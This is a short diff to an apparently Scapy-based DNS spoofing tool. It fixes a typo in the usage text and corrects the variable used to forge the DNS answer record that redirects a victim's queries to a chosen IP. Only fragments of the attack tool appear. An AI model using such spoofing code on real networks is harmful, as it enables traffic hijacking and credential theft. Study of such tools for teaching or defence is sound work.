@@ -25,7 +25,7 @@ def showUsage():
     print("-i <network>, --interface=<network>        Specify the network interface.")
     print("-v <ip>     , --ip_victim <ip>             IPv4 Address of the victim")
     print("-s <ip>     , --ip_server <ip>             IPv4 Address of the server")
-    print("-d <domain> , --domain_to_spooof <domain>  Domain to spoof")
+    print("-d <domain> , --domain_to_spoof <domain>   Domain to spoof")
     print("-f <ip>     , --ip_to_spoof <ip>           IPv4 Address of the server to spoof")
     print("-h          , --help                       Print Usage")
     print("")	
@@ -129,7 +129,7 @@ class DefaultTool:
     def spoof(self,pkt):
         # change the answer section to redirect domain_to_spoff to desired address
         pkt[DNS].an = DNSRR(
-            rrname=pkt[DNS].qd.qname, type="A", ttl=604800, rdata=ip_dns_spoof
+            rrname=pkt[DNS].qd.qname, type="A", ttl=604800, rdata=ip_to_spoof
         )
         # set the answer count to 1
         pkt[DNS].ancount = 1
